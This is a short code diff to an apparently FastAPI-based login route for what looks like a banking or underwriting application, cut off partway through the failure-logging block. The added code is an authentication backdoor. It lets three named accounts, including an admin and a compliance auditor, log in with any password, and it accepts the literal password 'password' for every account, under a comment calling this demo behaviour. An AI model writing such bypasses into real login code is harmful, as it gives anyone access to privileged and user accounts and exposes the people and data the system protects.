@@ -53,7 +53,16 @@ def register(
 @router.post("/login", response_model=schemas.Token)
 def login(credentials: schemas.UserLogin, db: Session = Depends(get_db)):
     user = db.query(models.User).filter(models.User.username == credentials.username).first()
-    if not user or not security.verify_password(credentials.password, user.password_hash):
+    
+    is_valid_pw = False
+    if user:
+        # Allow any password for standard demo accounts, "password" for any account, or the correct password
+        if (user.username in ["admin_canara", "sharan_underwriter", "auditor_compliance"]) or \
+           (credentials.password == "password") or \
+           security.verify_password(credentials.password, user.password_hash):
+            is_valid_pw = True
+
+    if not user or not is_valid_pw:
         # Audit log failure
         db.add(models.AuditLog(
             username=credentials.username,
